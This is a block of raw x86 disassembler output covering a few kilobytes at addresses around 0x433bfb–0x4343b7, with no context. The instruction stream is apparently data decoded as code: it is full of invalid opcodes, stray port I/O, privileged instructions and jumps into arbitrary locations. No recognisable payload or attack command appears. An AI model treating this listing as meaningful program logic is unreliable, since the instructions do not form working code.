  433bfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433bfc:	in     al,0x50
  433bfe:	ja     0x433bee
  433c00:	mov    al,ds:0x1a841a25
  433c05:	or     eax,0xb0190789
  433c0a:	cmp    esi,DWORD PTR [edx-0x5a]
  433c0d:	imul   ebp,edx,0xffffffe7
  433c10:	cwde   
  433c11:	jl     0x433c73
  433c13:	inc    edx
  433c14:	xchg   edx,eax
  433c15:	cmp    DWORD PTR [edi],0xffffff87
  433c18:	cli    
  433c19:	test   bl,bh
  433c1b:	fnstcw WORD PTR [ebx]
  433c1d:	cmp    cl,0x36
  433c20:	leave  
  433c21:	sti    
  433c22:	(bad)  
  433c23:	int3   
  433c24:	inc    eax
  433c25:	in     al,dx
  433c26:	cli    
  433c27:	mov    gs,WORD PTR [esp+ebx*2+0x28]
  433c2b:	loop   0x433bbf
  433c2d:	cli    
  433c2e:	jbe    0x433c83
  433c30:	(bad)  
  433c31:	fsubr  DWORD PTR [eax]
  433c33:	add    eax,0xb5c5d68e
  433c38:	mov    ebx,0x441f9532
  433c3d:	aas    
  433c3e:	sar    dh,0xcb
  433c41:	test   al,0x5d
  433c43:	nop
  433c44:	or     BYTE PTR [eax+0x5f],0x68
  433c48:	shl    BYTE PTR [ecx+0x4e],0xe1
  433c4c:	cmp    dl,bl
  433c4e:	retf   0xd16
  433c51:	jns    0x433c1e
  433c53:	mov    al,0xfe
  433c55:	push   esi
  433c56:	adc    ax,WORD PTR [edx-0x2e757ee7]
  433c5d:	sub    BYTE PTR [edi],ah
  433c5f:	sahf   
  433c60:	xor    al,0x65
  433c62:	sbb    eax,0x7e213d45
  433c67:	mov    ecx,0x2c2bab25
  433c6c:	sbb    BYTE PTR [edx+edx*2],bl
  433c6f:	jmp    0x433c62
  433c71:	outs   dx,BYTE PTR ds:[esi]
  433c72:	inc    edx
  433c73:	adc    DWORD PTR [edx+0x2238869d],0x89db1aa1
  433c7d:	or     eax,0x15320c4
  433c82:	pop    ss
  433c83:	iret   
  433c84:	sub    ecx,DWORD PTR [ebx+ebp*1+0x68]
  433c88:	cmp    DWORD PTR [eax-0x28],ecx
  433c8b:	and    al,0x90
  433c8d:	push   edx
  433c8e:	int3   
  433c8f:	aas    
  433c90:	or     DWORD PTR [edi-0x565ec6b2],ebp
  433c96:	daa    
  433c97:	ss dec ebp
  433c99:	push   0xffffffcf
  433c9b:	mov    DWORD PTR [eax-0x9],ebp
  433c9e:	aad    0x68
  433ca0:	aaa    
  433ca1:	es or  eax,0xb26d9de9
  433ca7:	nop
  433ca8:	inc    ebx
  433ca9:	cmp    ecx,edx
  433cab:	pop    ecx
  433cac:	jne    0x433d20
  433cae:	mov    dl,0x14
  433cb0:	scas   al,BYTE PTR es:[edi]
  433cb1:	fisttp DWORD PTR [edx-0x28e9c377]
  433cb7:	jbe    0x433c83
  433cb9:	cld    
  433cba:	out    dx,eax
  433cbb:	jge    0x433caf
  433cbd:	leave  
  433cbe:	mov    BYTE PTR [ecx],bl
  433cc0:	xchg   esp,eax
  433cc1:	inc    edx
  433cc2:	jnp    0x433cb3
  433cc4:	mov    WORD PTR [edi-0x5c],fs
  433cc7:	mov    dh,0xdf
  433cc9:	mov    ah,bh
  433ccb:	push   edi
  433ccc:	enter  0x4a0e,0x36
  433cd0:	loope  0x433c7c
  433cd2:	sbb    al,0xda
  433cd4:	mov    ds:0xa0040818,eax
  433cd9:	loopne 0x433cac
  433cdb:	sti    
  433cdc:	loop   0x433d5b
  433cde:	ins    DWORD PTR es:[edi],dx
  433cdf:	rcr    DWORD PTR [edi+0x3ee7885],1
  433ce5:	mov    dl,0x56
  433ce7:	xchg   BYTE PTR [edi],ah
  433ce9:	mov    edx,0xf3c7da31
  433cee:	jmp    0x6e06a912
  433cf3:	jb     0x433d26
  433cf5:	push   edx
  433cf6:	out    0x10,al
  433cf8:	aas    
  433cf9:	or     edi,DWORD PTR [edi]
  433cfb:	clc    
  433cfc:	sbb    BYTE PTR [eax],cl
  433cfe:	or     eax,0xcd2a8953
  433d03:	dec    ebp
  433d04:	mov    edi,0x1c01624c
  433d09:	xchg   esi,eax
  433d0a:	pushf  
  433d0b:	xchg   ebx,eax
  433d0c:	and    al,0x5c
  433d0e:	mov    BYTE PTR [ebp+0x72b68edf],bl
  433d14:	mov    ds:0x916947e1,al
  433d19:	inc    ecx
  433d1a:	imul   ecx,DWORD PTR [ebp-0x1a38b0cf],0x32
  433d21:	imul   ebp,DWORD PTR [ecx+esi*2+0x10982df0],0x16b9e5d8
  433d2c:	(bad)  
  433d2d:	es out 0xeb,eax
  433d30:	arpl   WORD PTR [edx],dx
  433d32:	mov    ds:0xb28a7376,eax
  433d37:	adc    DWORD PTR [ecx+0x47e1c89f],ebp
  433d3d:	es push ds
  433d3f:	fcomp  DWORD PTR [edx]
  433d41:	stos   BYTE PTR es:[edi],al
  433d42:	ins    DWORD PTR es:[edi],dx
  433d43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433d44:	and    DWORD PTR [ebx+ebx*2-0x48835fea],0x22
  433d4c:	imul   ebp,DWORD PTR [edx],0xffffffe4
  433d4f:	repz and ebx,DWORD PTR [eax+ecx*2-0x5]
  433d54:	dec    ebp
  433d55:	out    dx,eax
  433d56:	cmp    BYTE PTR [ebp+ecx*4-0x849a31f],dl
  433d5d:	sub    ch,dh
  433d5f:	push   esi
  433d60:	sub    ebx,DWORD PTR [edi+0x583235ec]
  433d66:	psraw  mm1,mm1
  433d69:	jnp    0x433cec
  433d6b:	std    
  433d6c:	xchg   edi,eax
  433d6d:	test   eax,ebx
  433d6f:	mov    eax,ds:0x6b2733e8
  433d74:	inc    ebp
  433d75:	je     0x433d29
  433d77:	dec    ebx
  433d78:	mov    dh,0xbb
  433d7a:	pop    edx
  433d7b:	fs aad 0x8a
  433d7e:	dec    esi
  433d7f:	and    esi,DWORD PTR [esi+esi*1]
  433d82:	in     al,0x3c
  433d84:	add    BYTE PTR [esp+eax*4-0x635fce73],bl
  433d8b:	sbb    al,0xa8
  433d8d:	in     al,0xf8
  433d8f:	or     BYTE PTR [eax],dh
  433d91:	adc    eax,0xb3f7ed38
  433d96:	into   
  433d97:	lods   al,BYTE PTR ds:[esi]
  433d98:	inc    esi
  433d99:	inc    edi
  433d9a:	repz or eax,0x6481d98c
  433da0:	imul   edx,DWORD PTR [edx-0x7ef6b227],0x50
  433da7:	shl    DWORD PTR [esi],0xfd
  433daa:	fwait
  433dab:	xchg   esi,eax
  433dac:	mov    ebp,0x23264e6
  433db1:	lahf   
  433db2:	inc    esp
  433db3:	sub    eax,DWORD PTR [eax]
  433db5:	adc    al,0x81
  433db7:	add    ecx,DWORD PTR [esi+0x7c0ae4]
  433dbd:	imul   esi,DWORD PTR [ebx],0x8460ea0d
  433dc3:	add    bl,BYTE PTR [edi+0x225c9b47]
  433dc9:	lea    edi,[edx+0x9]
  433dcc:	jae    0x433d80
  433dce:	fimul  DWORD PTR [esi]
  433dd0:	cmp    eax,0x3913ee57
  433dd5:	sbb    bh,ch
  433dd7:	inc    eax
  433dd8:	ins    DWORD PTR es:[edi],dx
  433dd9:	test   DWORD PTR [esi+0x3b],ebp
  433ddc:	ins    DWORD PTR es:[edi],dx
  433ddd:	cld    
  433dde:	push   ecx
  433ddf:	fst    QWORD PTR [ebx-0x2d]
  433de2:	out    dx,eax
  433de3:	enter  0x7078,0x8
  433de7:	cmp    ebx,ebp
  433de9:	mov    dl,0x4d
  433deb:	xchg   ebp,eax
  433dec:	dec    BYTE PTR [esi-0x16]
  433def:	std    
  433df0:	jnp    0x433e54
  433df2:	xor    ecx,DWORD PTR [esi+eiz*2-0x1d]
  433df6:	dec    esi
  433df7:	xchg   ecx,eax
  433df8:	enter  0x1941,0xd2
  433dfc:	lea    esp,[eax+0x24702781]
  433e02:	out    dx,al
  433e03:	ret    
  433e04:	push   edi
  433e05:	xor    BYTE PTR [ebx],dl
  433e07:	or     esi,DWORD PTR [ebx+0x2c]
  433e0a:	sahf   
  433e0b:	shl    DWORD PTR [edi],1
  433e0d:	fstp   TBYTE PTR [edx+0x60ec6247]
  433e13:	or     ebp,edx
  433e15:	xchg   esp,eax
  433e16:	sub    eax,DWORD PTR [esi]
  433e18:	out    dx,eax
  433e19:	mov    dh,0xc2
  433e1c:	jl     0x433e60
  433e1e:	sub    eax,DWORD PTR [ecx-0x33]
  433e21:	gs ins BYTE PTR es:[edi],dx
  433e23:	pusha  
  433e24:	mov    ch,0x81
  433e26:	inc    edi
  433e27:	mov    dl,0x4b
  433e29:	push   esi
  433e2a:	xchg   edi,eax
  433e2b:	icebp  
  433e2c:	sub    eax,0x1011c9cd
  433e31:	dec    esp
  433e32:	pushf  
  433e33:	dec    ebp
  433e34:	fld    DWORD PTR [edx+eiz*1+0x6c]
  433e38:	push   es
  433e39:	inc    esi
  433e3a:	sahf   
  433e3b:	lock sub ah,BYTE PTR [eax]
  433e3e:	xor    al,0xa2
  433e40:	dec    esp
  433e41:	sub    eax,0x470ca9f2
  433e46:	inc    ebp
  433e47:	xchg   edi,eax
  433e48:	dec    esp
  433e49:	dec    edx
  433e4a:	ret    
  433e4b:	fisub  DWORD PTR [edx]
  433e4d:	mov    ah,0x4a
  433e4f:	dec    esi
  433e50:	or     al,BYTE PTR [edx]
  433e52:	inc    edi
  433e53:	repnz rol DWORD PTR [eax],0x6f
  433e57:	inc    ebp
  433e58:	push   ds
  433e59:	ret    0x6e66
  433e5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433e5d:	jecxz  0x433eb9
  433e5f:	cld    
  433e60:	inc    ebp
  433e61:	test   al,0xf2
  433e63:	ins    BYTE PTR es:[edi],dx
  433e64:	xor    al,0xfa
  433e66:	pop    es
  433e67:	das    
  433e68:	push   es
  433e69:	xlat   BYTE PTR ds:[ebx]
  433e6a:	xor    BYTE PTR ds:0x9dbfcf01,0x3d
  433e71:	pop    ds
  433e72:	jg     0x433e77
  433e74:	xchg   DWORD PTR [edx-0x6d],edx
  433e77:	lods   al,BYTE PTR ds:[esi]
  433e78:	cmp    eax,0xea037663
  433e7d:	popa   
  433e7e:	int    0xc2
  433e80:	adc    BYTE PTR [eax+esi*1+0x1b524f06],al
  433e87:	jecxz  0x433e96
  433e89:	aad    0x3b
  433e8b:	cmp    BYTE PTR ds:0x1742858a,bl
  433e91:	jbe    0x433e52
  433e93:	cmp    dh,BYTE PTR [eax+0x47]
  433e96:	test   BYTE PTR [ecx],al
  433e98:	jae    0x433e6f
  433e9a:	xor    esp,edi
  433e9c:	add    al,0xcc
  433e9e:	pop    ecx
  433e9f:	inc    ebp
  433ea0:	push   ecx
  433ea1:	cmp    DWORD PTR [ecx-0x5bb0f62d],esi
  433ea7:	pop    ds
  433ea8:	xor    al,BYTE PTR [ecx]
  433eaa:	jno    0x433e6a
  433eac:	ins    BYTE PTR es:[edi],dx
  433ead:	adc    dx,sp
  433eb0:	and    dl,bh
  433eb2:	xor    ch,BYTE PTR [ebx-0x70]
  433eb5:	cmp    eax,0xed4a9cd8
  433eba:	mov    dl,0xe4
  433ebc:	fcmovne st,st(6)
  433ebe:	sbb    cl,BYTE PTR [ebx]
  433ec0:	and    eax,0x6a177619
  433ec5:	or     eax,0x11aa0e0e
  433eca:	dec    ebp
  433ecb:	retf   
  433ecc:	xor    al,0x57
  433ece:	and    cl,dh
  433ed0:	fisub  DWORD PTR [edx+0x10]
  433ed3:	xchg   ebx,eax
  433ed4:	inc    esp
  433ed5:	push   ds
  433ed6:	nop
  433ed7:	jno    0x433ee5
  433ed9:	xchg   edx,eax
  433eda:	test   DWORD PTR [edx-0x16],edx
  433edd:	out    dx,eax
  433ede:	sub    DWORD PTR [ecx+0x2633a33c],ebx
  433ee4:	mov    DWORD PTR [ecx],ecx
  433ee6:	push   0xffffffce
  433ee8:	ss inc ebp
  433eea:	fisubr WORD PTR [esi]
  433eec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433eed:	cmp    esi,esi
  433eef:	pop    ss
  433ef0:	in     eax,dx
  433ef1:	xchg   BYTE PTR [ebx+0xb9a429f],bl
  433ef7:	mov    dl,0xa
  433ef9:	fsub   DWORD PTR [ebx]
  433efb:	xchg   DWORD PTR [ecx-0x3993c540],eax
  433f01:	repz test eax,0x931f33d6
  433f07:	xchg   ebx,esp
  433f09:	mov    bl,BYTE PTR [eax+0x6e]
  433f0c:	push   0xfffffffb
  433f0e:	popa   
  433f0f:	cmp    DWORD PTR [ebp+0x13065877],ebx
  433f15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433f16:	out    0x70,eax
  433f18:	jb     0x433eec
  433f1a:	push   DWORD PTR [ecx-0x4b8b2088]
  433f20:	add    DWORD PTR [ecx+0x40],esp
  433f23:	push   0xfffffff0
  433f25:	mov    ecx,0x354c3798
  433f2a:	in     al,dx
  433f2b:	(bad)  
  433f2c:	hlt    
  433f2d:	int3   
  433f2e:	and    al,0x40
  433f30:	outs   dx,BYTE PTR ds:[esi]
  433f31:	inc    esp
  433f32:	mov    ebx,0xc4ae7470
  433f37:	xor    eax,0x11d26587
  433f3c:	jb     0x433f78
  433f3e:	fidiv  DWORD PTR [edx+0x1b4c031]
  433f44:	inc    esi
  433f45:	mov    ?,WORD PTR [edi-0x62]
  433f48:	rcr    DWORD PTR ds:0x1e34f25a,cl
  433f4e:	fnsave [edx-0x25da547d]
  433f54:	sub    cl,0x0
  433f57:	xor    esi,eax
  433f59:	push   eax
  433f5a:	cmp    al,0x83
  433f5c:	push   ebx
  433f5d:	popf   
  433f5e:	fbld   TBYTE PTR [esp+ebx*4-0xa]
  433f62:	enter  0xfff6,0x66
  433f66:	mov    WORD PTR [ebx],?
  433f68:	or     DWORD PTR [eax+0x38],edx
  433f6b:	repz push eax
  433f6d:	ret    
  433f6e:	leave  
  433f6f:	ins    DWORD PTR es:[edi],dx
  433f70:	fmul   DWORD PTR [ecx+0x30c8eefb]
  433f76:	pop    edx
  433f77:	(bad)  
  433f78:	xor    ebp,esi
  433f7a:	gs es mov esi,0x2cfb2bbf
  433f81:	test   al,0x97
  433f83:	add    BYTE PTR [esi],0x41
  433f86:	popfw  
  433f88:	mov    ds:0x41f3703f,al
  433f8d:	ror    DWORD PTR [ebp+0x10c38f0a],0x67
  433f94:	and    DWORD PTR [ecx],esp
  433f96:	(bad)  
  433f98:	call   0x325701dc
  433f9d:	push   esi
  433f9e:	jo     0x433fd3
  433fa0:	std    
  433fa1:	xacquire xchg BYTE PTR [edi-0x6f200077],bl
  433fa8:	popf   
  433fa9:	ret    0xef00
  433fac:	rcr    BYTE PTR [eax],1
  433fae:	shl    BYTE PTR [edx+0x31],1
  433fb1:	leave  
  433fb2:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433fb4:	popa   
  433fb5:	cmp    ah,cl
  433fb7:	aaa    
  433fb8:	push   eax
  433fb9:	mov    dh,0x6e
  433fbb:	shl    DWORD PTR [ebp-0x785dfb1b],cl
  433fc1:	retf   0xe90
  433fc4:	arpl   ax,di
  433fc6:	cmp    esp,DWORD PTR [ebp+0x5b]
  433fc9:	lea    ebx,[ebx-0x7d6ffecf]
  433fcf:	inc    eax
  433fd0:	push   cs
  433fd1:	bswap  ecx
  433fd3:	jbe    0x433fe9
  433fd5:	pop    esi
  433fd6:	push   eax
  433fd7:	add    BYTE PTR [ebx],ch
  433fd9:	cmp    BYTE PTR [edx],bl
  433fdb:	jo     0x434045
  433fdd:	aam    0xc5
  433fdf:	or     esp,DWORD PTR [ebp-0x2768ad7d]
  433fe5:	xor    ecx,esi
  433fe7:	psrad  mm3,QWORD PTR [ebx+0x4db83155]
  433fee:	mov    cl,0x98
  433ff0:	mov    al,0x1b
  433ff2:	pop    ecx
  433ff3:	dec    esp
  433ff4:	cmp    bh,bl
  433ff6:	sbb    ah,BYTE PTR [edx+0x22]
  433ff9:	imul   ecx,DWORD PTR [ebx],0x9d6c22a0
  433fff:	hlt    
  434000:	pop    ebp
  434001:	xchg   edi,eax
  434002:	ins    BYTE PTR es:[edi],dx
  434003:	mov    esi,DWORD PTR [edx]
  434005:	js     0x433fce
  434007:	mov    bl,0x76
  434009:	rol    eax,0x3a
  43400c:	adc    al,0xf7
  43400e:	dec    esi
  43400f:	leave  
  434010:	imul   BYTE PTR [edx+ebx*1-0x7d]
  434014:	push   edi
  434015:	(bad)  
  434017:	mov    ds:0xeacab51d,eax
  43401c:	cs push cs
  43401e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43401f:	in     eax,dx
  434020:	sbb    BYTE PTR [ebx],dl
  434022:	leave  
  434023:	adc    al,0xdb
  434025:	pushf  
  434026:	cmp    BYTE PTR [ecx],0xd3
  434029:	push   cs
  43402a:	sub    dh,BYTE PTR [eax]
  43402c:	test   al,0x43
  43402e:	mov    ah,0x25
  434030:	cmp    al,0xcb
  434032:	pushf  
  434033:	pop    eax
  434034:	aam    0x7d
  434036:	inc    ebx
  434037:	in     eax,0x86
  434039:	mov    cs,WORD PTR [ebx+0x489cc689]
  43403f:	iret   
  434040:	sbb    edx,DWORD PTR [ebp-0x6058fdd5]
  434046:	sub    esi,DWORD PTR [ecx-0x34226a78]
  43404c:	mov    bl,0xe6
  43404e:	mov    ds:0xbcf1b39f,eax
  434053:	xor    eax,0x46d58059
  434058:	mov    edi,0x4805453
  43405d:	and    DWORD PTR [edx],ecx
  43405f:	xchg   DWORD PTR [ebx+ecx*8-0x66f165c2],ebp
  434066:	scas   al,BYTE PTR es:[edi]
  434067:	jp     0x4340ad
  434069:	push   esi
  43406a:	pop    ecx
  43406b:	jno    0x434081
  43406d:	inc    ebx
  43406e:	sbb    ecx,esi
  434070:	mov    eax,ds:0x99c046c1
  434075:	xchg   esi,eax
  434076:	out    dx,al
  434077:	cmp    eax,0x6424cf19
  43407c:	dec    ecx
  43407d:	enter  0x3774,0xc6
  434081:	imul   ebx,DWORD PTR [edi+eax*1+0x29],0xffffffe9
  434086:	push   0xffffffe4
  434088:	lock push ss
  43408a:	(bad)  [esi-0x3b71d4a0]
  434090:	xor    edi,DWORD PTR [ebx]
  434092:	fs jg  0x4340a3
  434095:	fisub  DWORD PTR [ebp+0x7a]
  434098:	out    0x70,eax
  43409a:	fcom   QWORD PTR [ebx-0x6e]
  43409d:	xor    eax,0x73ef3483
  4340a2:	cmp    ch,al
  4340a4:	mov    DWORD PTR [edi-0x7d],eax
  4340a7:	in     eax,0xbb
  4340a9:	ret    
  4340aa:	pop    ecx
  4340ab:	mov    edi,0x32539b58
  4340b0:	pop    eax
  4340b1:	mov    cl,BYTE PTR [ebp+0x35]
  4340b4:	sbb    eax,0xf4894eb
  4340b9:	inc    BYTE PTR [ebx+0x390f915]
  4340bf:	nop
  4340c0:	test   DWORD PTR [esi-0x7f2e80b9],eax
  4340c6:	cmp    DWORD PTR [edx+ebx*2],edi
  4340c9:	mov    bl,0x75
  4340cb:	inc    edi
  4340cc:	rcr    BYTE PTR [edi+ebx*2-0xc],cl
  4340d0:	popf   
  4340d1:	adc    ch,ch
  4340d3:	cmp    DWORD PTR [edx+0x70],ebx
  4340d6:	push   edi
  4340d7:	into   
  4340d8:	test   eax,0x524f3c21
  4340dd:	pop    ss
  4340de:	pop    eax
  4340df:	sbb    ah,0x2f
  4340e2:	ret    
  4340e3:	popa   
  4340e4:	inc    esi
  4340e5:	jb     0x434146
  4340e7:	jmp    0x495f7ec0
  4340ec:	mov    ecx,0xf0e539d1
  4340f1:	fild   DWORD PTR [ecx+0x3]
  4340f4:	jns    0x43407e
  4340f6:	fs das 
  4340f8:	push   es
  4340f9:	mov    ds:0xc7030639,al
  4340fe:	or     ecx,esp
  434100:	sbb    esp,ecx
  434102:	pop    es
  434103:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434104:	pop    ds
  434105:	(bad)  
  434107:	sub    DWORD PTR ds:0xab505874,ebx
  43410d:	cs std 
  43410f:	inc    esi
  434110:	xchg   edx,eax
  434111:	outs   dx,BYTE PTR ds:[esi]
  434112:	addr16 sbb eax,0xc90f4067
  434118:	pop    eax
  434119:	test   BYTE PTR ds:0x86d534b9,ah
  43411f:	sbb    al,0xf2
  434121:	jmp    0xcbb330b2
  434126:	jbe    0x43413e
  434128:	loope  0x43413c
  43412a:	pushf  
  43412b:	inc    ebp
  43412c:	mov    ecx,0xe577b27
  434131:	or     esi,esi
  434133:	sbb    ebp,DWORD PTR fs:[eax+0x5e]
  434137:	push   esi
  434138:	test   eax,0x1277b3d6
  43413d:	out    dx,al
  43413e:	and    esi,DWORD PTR [esi+0x5cd6064b]
  434144:	imul   edi,DWORD PTR ss:[eax],0xa2c6f068
  43414b:	(bad)  
  43414c:	rcl    BYTE PTR [esi-0x3939ce24],1
  434152:	and    BYTE PTR [esi-0x6b750561],dl
  434158:	pop    ds
  434159:	xchg   ecx,eax
  43415a:	mov    ch,0x97
  43415c:	adc    esi,ecx
  43415e:	mov    ?,WORD PTR [edx-0x116ff194]
  434164:	test   BYTE PTR [ecx],bh
  434166:	adc    eax,edx
  434168:	cmp    DWORD PTR [eax+0x4],ebp
  43416b:	or     cl,ch
  43416d:	fstp   TBYTE PTR [ebp+0x2472cbe0]
  434173:	add    al,0xae
  434175:	mov    ecx,0xece9ef74
  43417a:	repz inc esi
  43417c:	cdq    
  43417d:	push   edx
  43417e:	cmp    al,0xb5
  434180:	jno    0x4341d2
  434182:	(bad)  
  434183:	dec    ebp
  434184:	aam    0x67
  434186:	iret   
  434187:	pop    edi
  434188:	mov    WORD PTR [ebp-0x2e],cs
  43418b:	and    bl,BYTE PTR [ebx-0x3275f773]
  434191:	pop    eax
  434192:	pcmpgtb mm6,QWORD PTR [ecx+eax*2-0x713c7eaa]
  43419a:	dec    ebp
  43419b:	(bad)  
  43419d:	lgs    edx,FWORD PTR [ebx+edx*1]
  4341a1:	mov    WORD PTR [eax],?
  4341a3:	jmp    0x71ceee24
  4341a8:	cdq    
  4341a9:	ss out dx,al
  4341ab:	mov    ds,WORD PTR [eax+edi*4+0x66]
  4341af:	sub    ebx,edx
  4341b1:	(bad)  
  4341b2:	xor    edx,DWORD PTR [edi-0xce5b89c]
  4341b8:	sahf   
  4341b9:	ficomp WORD PTR [ebp+0x72539734]
  4341bf:	or     BYTE PTR [edx-0x23833c38],dl
  4341c5:	xchg   DWORD PTR [esi],edx
  4341c7:	test   BYTE PTR [esi],ah
  4341c9:	sar    DWORD PTR [ebp+0x5c],0x37
  4341cd:	sub    ebp,DWORD PTR [ebx+0xa]
  4341d0:	jnp    0x434184
  4341d2:	sub    DWORD PTR [edx+ebp*2+0x35],ecx
  4341d6:	or     dl,dl
  4341d8:	fsubr  QWORD PTR [ebp+eax*1+0xb]
  4341dc:	xor    ebp,DWORD PTR [eax]
  4341de:	fwait
  4341df:	or     ecx,DWORD PTR ds:0x215a272
  4341e5:	adc    DWORD PTR [eax+0x76],ebp
  4341e8:	inc    ebx
  4341e9:	test   BYTE PTR [esp+eax*1],0x68
  4341ed:	push   0xffffffdf
  4341ef:	or     BYTE PTR [edx+ebx*2],0xa3
  4341f3:	js     0x434220
  4341f5:	imul   ebx,DWORD PTR [ecx],0x5f
  4341f8:	inc    esi
  4341f9:	out    dx,al
  4341fa:	in     al,0x5b
  4341fc:	xchg   esi,eax
  4341fd:	mov    esi,DWORD PTR [edi-0x39109a4c]
  434203:	adc    al,0xe1
  434205:	lock sub eax,0x2485876b
  43420b:	faddp  st(7),st
  43420d:	sub    DWORD PTR [edx-0x73127746],eax
  434213:	cmp    eax,0x3a70ec05
  434218:	test   DWORD PTR es:[eax+eiz*4],eax
  43421c:	push   ds
  43421d:	pop    ecx
  43421e:	xor    ah,bl
  434220:	mov    eax,ds:0x92b9b3c5
  434225:	fisttp QWORD PTR [edi]
  434227:	shr    BYTE PTR [ebp+edx*2+0x4e],cl
  43422b:	sub    BYTE PTR [ecx-0x38],0x36
  43422f:	and    eax,0xc5779321
  434234:	outs   dx,DWORD PTR ds:[esi]
  434235:	add    BYTE PTR [edi],dh
  434237:	test   BYTE PTR [edi+0x50],cl
  43423a:	lea    eax,[eax-0x77e26d84]
  434240:	neg    DWORD PTR [eax]
  434242:	(bad)  [edi+0x123ffb32]
  434248:	xchg   edi,eax
  434249:	lea    esi,[eax]
  43424b:	and    ebp,DWORD PTR [ebx+0x1bc54ab]
  434251:	adc    DWORD PTR [edi+0x27],0xe3d7657b
  434258:	mov    edx,0xcde764b7
  43425d:	ins    BYTE PTR es:[edi],dx
  43425e:	pop    esp
  43425f:	xchg   DWORD PTR [ebx-0x4616ad72],eax
  434265:	jae    0x4342da
  434267:	ds jnp 0x434278
  43426a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43426b:	clc    
  43426c:	mov    ch,0x98
  43426e:	mov    esp,0xa07cd915
  434273:	add    ah,BYTE PTR es:[edi-0x206116cc]
  43427a:	and    DWORD PTR [ebx-0xe],edi
  43427d:	icebp  
  43427e:	(bad)  
  43427f:	adc    ch,cl
  434281:	pusha  
  434282:	loop   0x4342f3
  434284:	leave  
  434285:	fs pushf 
  434287:	push   0xbbd00864
  43428c:	jno    0x4342cb
  43428e:	or     eax,DWORD PTR [edi]
  434290:	jo     0x4342a4
  434292:	jmp    0xd586:0xb40ffe1f
  434299:	cwde   
  43429a:	outs   dx,DWORD PTR ds:[esi]
  43429b:	test   BYTE PTR [edi-0x16],bl
  43429e:	repz arpl WORD PTR [edx+0x6d4a0a07],di
  4342a5:	cmp    ah,BYTE PTR [ecx]
  4342a7:	or     edi,DWORD PTR [esi+ecx*2+0x32]
  4342ab:	mov    dl,0x41
  4342ad:	pop    ss
  4342ae:	mov    bl,0x4d
  4342b0:	xchg   DWORD PTR [edi+0x15f476f9],eax
  4342b6:	dec    ebp
  4342b7:	nop
  4342b8:	or     eax,0xddf314d5
  4342bd:	adc    esi,edi
  4342bf:	ficom  WORD PTR [eax-0xe5437bd]
  4342c5:	sahf   
  4342c6:	lds    ebp,FWORD PTR [eax-0x35]
  4342c9:	inc    eax
  4342ca:	mov    dh,0x31
  4342cc:	scas   al,BYTE PTR es:[edi]
  4342cd:	retf   0x5068
  4342d0:	push   0x18
  4342d2:	jb     0x43430c
  4342d4:	jo     0x434258
  4342d6:	mov    dl,0xd0
  4342d8:	adc    eax,0xce587763
  4342dd:	rcr    eax,cl
  4342df:	(bad)  
  4342e0:	mov    esi,0x48702a60
  4342e5:	and    al,0xa1
  4342e7:	xor    DWORD PTR [esi],ebx
  4342e9:	iret   
  4342ea:	push   0xffffffc9
  4342ec:	fcmove st,st(3)
  4342ee:	or     DWORD PTR [edx+0x28c41b03],ecx
  4342f4:	(bad)  
  4342f5:	cs dec esi
  4342f7:	push   ecx
  4342f8:	leave  
  4342f9:	fst    DWORD PTR [esi+0x5a63223]
  4342ff:	dec    DWORD PTR [eax]
  434301:	pop    edx
  434302:	add    al,0x88
  434304:	push   esi
  434305:	jb     0x4342fb
  434307:	xchg   edi,eax
  434308:	and    DWORD PTR gs:[ebp-0x4f0d6a05],ebx
  43430f:	xor    al,0x95
  434311:	mov    ecx,0x7322fba1
  434316:	adc    BYTE PTR [edi+0x12],bl
  434319:	iret   
  43431a:	pushf  
  43431b:	xchg   ecx,eax
  43431c:	popf   
  43431d:	ret    0x41c
  434320:	loopne 0x43433c
  434322:	pop    edx
  434323:	in     al,0x8
  434325:	push   ds
  434326:	add    dh,BYTE PTR [ebx+0x47]
  434329:	(bad)  
  43432a:	sub    eax,0xb7a4c934
  43432f:	in     eax,0xc3
  434331:	jecxz  0x4343a3
  434333:	in     al,0x2
  434335:	pusha  
  434336:	stos   DWORD PTR es:[edi],eax
  434337:	dec    ecx
  434338:	(bad)  
  434339:	and    al,0x73
  43433b:	pop    edx
  43433c:	loop   0x434382
  43433e:	inc    eax
  43433f:	cmp    eax,0xfbba43c2
  434344:	mov    dh,0x86
  434346:	xor    bh,BYTE PTR [ecx]
  434348:	ins    DWORD PTR es:[edi],dx
  434349:	fldenv [esi]
  43434b:	push   esp
  43434c:	sub    al,0x28
  43434e:	(bad)  
  43434f:	fisubr DWORD PTR [eax-0x6677876b]
  434355:	inc    eax
  434356:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434357:	das    
  434358:	push   0x28
  43435a:	test   al,0x2e
  43435c:	add    BYTE PTR [eax-0x24],cl
  43435f:	iret   
  434360:	test   eax,0x870b138c
  434365:	or     BYTE PTR [ecx],bh
  434367:	add    esi,DWORD PTR [ebx]
  434369:	jb     0x4343ad
  43436b:	push   ecx
  43436c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43436d:	jl     0x434319
  43436f:	repnz fadd st(5),st
  434372:	cwde   
  434373:	sub    al,0xa2
  434375:	sbb    bh,BYTE PTR [ebx+0x59]
  434378:	pop    ebx
  434379:	push   cs
  43437a:	leave  
  43437b:	call   0xcbb6:0xc189bf0d
  434382:	push   ds
  434383:	jbe    0x434329
  434385:	ss in  eax,0xd4
  434388:	jmp    0x44ca:0x6c2149b3
  43438f:	loopne 0x434381
  434391:	dec    esp
  434392:	xchg   ebx,eax
  434393:	nop
  434394:	jo     0x43439f
  434396:	dec    edi
  434397:	lds    edi,FWORD PTR [ebx-0x11]
  43439a:	enter  0x6290,0x36
  43439e:	xor    DWORD PTR [ecx+0x56323dfc],edi
  4343a4:	lahf   
  4343a5:	dec    ebp
  4343a6:	mov    BYTE PTR [eax+0x2a3cfd48],ah
  4343ac:	xchg   eax,edi
  4343ae:	mov    cs,eax
  4343b0:	dec    eax
  4343b1:	inc    edi
  4343b2:	and    dl,BYTE PTR [ebx]
  4343b4:	add    BYTE PTR [ebx+0x72],dl
  4343b7:	inc    esi
